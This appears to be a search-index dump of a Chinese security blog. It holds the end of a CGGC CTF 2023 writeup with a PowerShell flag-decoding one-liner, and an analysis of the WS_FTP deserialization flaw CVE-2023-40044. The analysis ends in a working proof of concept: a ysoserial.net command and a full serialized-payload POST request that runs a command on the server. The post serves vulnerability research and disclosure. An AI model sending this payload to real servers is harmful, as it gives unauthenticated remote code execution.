Description:\nDO you know how automatic destination file work? (The flag is separarted into four parts)\n在檔案最下面發現 last part\nC:\\Challenge\\_l457_p4r7_15_h1dd3n!} 用 l l e n g e \\ 後面的 path 才能找到順序正確的 flag 片段，用 C:\\Challenge\\ 找的話順序會跑掉。\nF L A G IS Pr ob bly Here! Youre Clo se Here It is_ CG GC{ 3 z _f 1 r5 7_ qu 4 r 7 3r _ CGGC{3z_f1r57_qu4r73r_ 這 part 則是把 PowerShell script 拿出來執行就可以了。\nC:\\\u0026gt; $t=\u0026#39;aRB3BDtBNRAiBGFBNBA2BGVB[tB0BDdBNRAzBDRB[tBtBD7BNtB\u0026gt;\u0026#39;;for(($i=0);$i-lt$t.Length;$i++){$k+=[char]($t[$i]-bxor3)};[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($k)) m4l1c10u5_7h1rd_0n3 m4l1c10u5_7h1rd_0n3 最後就剩下 second part 卡關了，所以這題沒解出來:(\nCGGC{3z_f1r57_qu4r73r_ m4l1c10u5_7h1rd_0n3 _l457_p4r7_15_h1dd3n!} ","date":"2023-12-09","externalUrl":null,"permalink":"/posts/cggc+ctf+2023+writeup/","section":"Posts","summary":"[Web] bossti # Description:\nI wish you were a boss wannabe.\n明顯就是要竄改 JWT 來登入\nJWT 解開後，簽名的 Secret 是空值。\n把 JWT 改成題目提示的 boss。","title":"CGGC CTF 2023 初賽 Writeup","type":"posts"},{"content":"","date":"2023-12-09","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"2023-10-08","externalUrl":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"CVE","type":"tags"},{"content":" 漏洞簡介 # 在 WS_FTP Server 8.7.4 和 8.8.2 之前的版本，未經身分驗證的攻擊者可以在 Ad Hoc Transfer 模組中利用 .NET 反序列化漏洞，在 WS_FTP Server 系統上進行遠端命令執行。值得注意的是，WS_FTP Server 的 Ad Hoc Transfer 模組是標準安裝的一部分，大部分的 WS_FTP Server 都會受影響。Progress Software 的建議是所有客戶都要升級到最新的軟體版本，或者刪除/停用 Ad Hoc Transfer 模組。\n此漏洞是由 Assetnote 所發現，未經身分驗證的攻擊者很容易就能在目標系統上實現 RCE。\nRapid7 觀察到此漏洞在野外已經被利用了。而且，CISA 也根據主動利用的證據，將暴露情況加入到其 已知被利用的漏洞目錄 (Known Exploited Vulnerabilities Catalog) 之中。\n此漏洞的 CVE 編號已被指定為 CVE-2023-40044，其 CVSSv3 評分至少為 8.8，嚴重度高。\n受影響的產品 # 如果啟用了 Ad Hoc Transfer 模組，則以下軟體版本都會受到影響：\n2022.0.1 (8.8.1) 2022.0 (8.8.0) 2020.0.0 (8.7.0) 2020.0.1 (8.7.1) 2020.0.2 (8.7.2) 2020.0.3 (8.7.3) 分析 # FormStream Class # 這個漏洞的根本原因是不安全的反序列化。存在漏洞的 DeserializeProcessor() 方法嘗試反序列化使用者可控，且沒有經過檢查或確認的資料。\ninternal IFileProcessor DeserializeProcessor(string input) { BinaryFormatter binaryFormatter = new BinaryFormatter(); MemoryStream serializationStream1 = new MemoryStream(Convert.FromBase64String(input)); SettingsStorageObject settingsStorageObject = (SettingsStorageObject) binaryFormatter.Deserialize((Stream) serializationStream1); // \u0026lt;-- 不安全的反序列化 嘗試往前追會發現 DeserializeProcessor() 方法被 CheckForActionFields() 方法所呼叫。而 CheckForActionFields() 方法會嘗試提取 multipart 欄位中 ::AHT_DEFAULT_UPLOAD_PARAMETER:: 之後的字串，然後將該字串交給 DeserializeProcessor() 方法進行反序列化。\n此外, ::AHT_UPLOAD_PARAMETER:: 的存在似乎也會觸發相同的不安全反序列化過程。\nprivate void CheckForActionFields() { byte[] array = this._currentField.ToArray(); string result1 = string.Empty; int boundaryPos = this.IndexOf(array, this.BOUNDARY); if (!this.TryParseActionField(this.ID_TAG, array, out result1, boundaryPos)) { string result2 = string.Empty; if (this.TryParseActionField(this.DEFAULT_PARAMS_TAG, array, out result2, boundaryPos)) // \u0026lt;-- ::AHT_DEFAULT_UPLOAD_PARAMETER:: { this._defaultProcessor = UploadManager.Instance.DeserializeProcessor(result2.Substring(this.DEFAULT_PARAMS_TAG.Length)); // \u0026lt;-- 不安全的反序列化 this._processor = this._defaultProcessor; this._currentField = new MemoryStream(); } else if (this.TryParseActionField(this.PARAMS_TAG, array, out result2, boundaryPos)) // \u0026lt;-- ::AHT_UPLOAD_PARAMETER:: { this._processor = UploadManager.Instance.DeserializeProcessor(result2.Substring(this.PARAMS_TAG.Length)); // \u0026lt;-- 不安全的反序列化 this._currentField = new MemoryStream(); } 要到達 CheckForActionFields() 方法，需要依序呼叫 ProcessField() 和 Write() 方法。\nprivate FormStream.SectionResult ProcessField(byte[] bytes, int pos) { int nextOffset1 = -1; if (pos \u0026lt; bytes.Length - 1) { nextOffset1 = this.IndexOf(bytes, this.BOUNDARY, pos + 1); if (nextOffset1 != -1 \u0026amp;\u0026amp; this._inFile) nextOffset1 -= 2; } if (nextOffset1 \u0026gt;= 0) { this.WriteBytes(this._inFile, bytes, pos, nextOffset1 - pos); if (!this._inFile) this.CheckForActionFields(); // \u0026lt;-- 存在漏洞的方法 Write() 方法會遍歷 HTTP form-data，搜尋邊界字串並解析每個欄位的標頭。 要觸發 ProcessField() 方法，必須滿足以下條件：\nthis._inField 必須為 true multipart 欄位的標頭不能包含 filename 以及 Content-Disposition this._inFile 必須是 false public override void Write(byte[] bytes, int offset, int count) { int num1 = 0; byte[] numArray; if (this._buffer != null) { numArray = new byte[this._buffer.Length + count]; Buffer.BlockCopy((Array) this._buffer, 0, (Array) numArray, 0, this._buffer.Length); Buffer.BlockCopy((Array) bytes, offset, (Array) numArray, this._buffer.Length, count); } else { numArray = new byte[count]; Buffer.BlockCopy((Array) bytes, offset, (Array) numArray, 0, count); } this._position += (long) count; int srcOffset; int num2; FormStream.SectionResult sectionResult; do { if (this._headerNeeded) { srcOffset = num1; num2 = this.IndexOf(numArray, this.BOUNDARY, num1); if (num2 \u0026gt;= 0) { if (this.IndexOf(numArray, this.EOF, num2) != num2) { int num3 = this.IndexOf(numArray, this.EOH, num2); if (num3 \u0026gt;= 0) { this._inField = true; // \u0026lt;-- _inField = true this._headerNeeded = false; Dictionary\u0026lt;string, string\u0026gt; header = this.ParseHeader(numArray, num2); if (header != null) { if (header.ContainsKey(\u0026#34;filename\u0026#34;) \u0026amp;\u0026amp; header.ContainsKey(\u0026#34;Content-Disposition\u0026#34;)) // \u0026lt;-- 必須是 false { string fileName = header[\u0026#34;filename\u0026#34;].Trim(\u0026#39;\u0026#34;\u0026#39;).Trim(); if (!string.IsNullOrEmpty(fileName)) { try { this._fileName = header[\u0026#34;filename\u0026#34;].Trim(\u0026#39;\u0026#34;\u0026#39;); this._inFile = true; string contentType = !header.ContainsKey(\u0026#34;Content-Type\u0026#34;) ? \u0026#34;application/octet-stream\u0026#34; : header[\u0026#34;Content-Type\u0026#34;]; this.fileProccessingEnded = false; object identifier = this._processor.StartNewFile(fileName, contentType, header, this._previousFields); this.OnFileStarted(fileName, identifier); } catch (Exception ex) { this._fileError = true; this.OnError(ex); } } } else { this._inFile = false; // \u0026lt;-- _inFile = false this._currentField = new MemoryStream(); this._currentFieldName = header[\u0026#34;name\u0026#34;]; } num1 = num3 + 4; } else goto label_9; } else goto label_17; } else goto label_6; } else goto label_18; } if (this._inField) { this._buffer = (byte[]) null; sectionResult = this.ProcessField(numArray, num1); // \u0026lt;-- 存在漏洞的方法 UploadModule Class # UploadModule 確定傳入的 HTTP 請求是否是 multipart 檔案上傳。如果是 multipart 檔案上傳，Context_AcquireRequestState() 方法將會建立一個FormStream物件，該物件會呼叫 Write() 方法來處理此請求。\npublic class UploadModule : IHttpModule { private void Context_AcquireRequestState(object sender, EventArgs e) { // ... string boundary = \u0026#34;--\u0026#34; + knownRequestHeader.Substring(knownRequestHeader.IndexOf(\u0026#34;boundary=\u0026#34;) + \u0026#34;boundary=\u0026#34;.Length); using (FormStream formStream = new FormStream(this.GetProcessor(), boundary, app.Request.ContentEncoding)) { formStream.FileCompleted += new FileEventHandler(this.fs_FileCompleted); formStream.FileCompletedError += new FileErrorEventHandler(this.fs_FileCompletedError); formStream.FileStarted += new FileEventHandler(this.fs_FileStarted); formStream.Error += new ErrorEventHandler(this.OnTransactionAborted); this._context = app.Context; long bytes = 0; if (workerRequest.GetPreloadedEntityBodyLength() \u0026gt; 0) { byte[] preloadedEntityBody = workerRequest.GetPreloadedEntityBody(); formStream.Write(preloadedEntityBody, 0, preloadedEntityBody.Length); // \u0026lt;-- 存在漏洞的方法 在 WS_FTP Ad Hoc Transfer 應用程式的 web.config 中，MyFileUpload.UploadModule 模組會被載入到 IIS HTTP 模組中，並處理傳入的檔案上傳請求。因此，發送至 Ad Hoc Transfer 模組中以 /AHT/ 為開頭的 URI 的 multipart HTTP 請求都可能觸發漏洞。\n\u0026lt;httpModules\u0026gt; \u0026lt;add name=\u0026#34;extend_session_module\u0026#34; type=\u0026#34;AHT.Main.ExtendUserSessionModule\u0026#34; /\u0026gt; \u0026lt;add name=\u0026#34;upload_module\u0026#34; type=\u0026#34;MyFileUpload.UploadModule, fileuploadlibrary, Version=4.0.0.0\u0026#34; /\u0026gt; \u0026lt;/httpModules\u0026gt; PoC # 利用 ysoserial.net 來產生 .NET 反序列化酬載：\n.\\ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c \u0026#34;notepad.exe\u0026#34; -o base64 HTTP multipart POST 請求：\nPOST /AHT/AhtApiService.asmx/AuthUser HTTP/1.1 Host: victim.com User-Agent: CVE-2023-40044 Accept: */* Content-Length: 1303 Content-Type: multipart/form-data; boundary=boundary --boundary name: PoC ::AHT_DEFAULT_UPLOAD_PARAMETER::AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAugU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5vdGVwYWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs= --boundary– 參考資料 # https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023 https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044 https://attackerkb.com/topics/bn32f9sNax/cve-2023-40044/rapid7-analysis ","date":"2023-10-08","externalUrl":null,"permalink":"/posts/progress+ws_ftp+server+rce-cve-2023-40044/","section":"Posts","summary":"漏洞簡介 # 在 WS_FTP Server 8.7.4 和 8.8.2 之前的版本，未經身分驗證的攻擊者可以在 Ad Hoc Transfer 模組中利用 .NET 反序列化漏洞，在 WS_FTP Server 系統上進行遠端命令執行。值得注意的是，WS_FTP Server 的 Ad Hoc Transfer 模組是標準安裝的一部分，大部分的 WS_FTP Server 都會受影響。Progress Software 的建議是所有客戶都要升級到最新的軟體版本，或者刪除/停用 Ad Hoc Transfer 模組。","title":"Progress WS_FTP Server 不安全的反序列化漏洞(CVE-2023-40044)","type":"posts"},{"content":"","date":"2023-10-08","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE","type":"tags"},{"content":"","date":"2023-10-08","externalUrl":null,"permalink":"/tags/ws_ftp/","section":"Tags","summary":"","title":"WS_FTP","type":"tags"},{"content":"拖延症末期患者遲早會寫的\n","date":"0001-01-01","externalUrl":null,"permalink":"/about/","section":"KinJih's space","summary":"拖延症末期患者遲早會寫的","title":"About Me","type":"page"},{"content":"","date":"0001-01-01","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"0001-01-01","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"0001-01-01","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]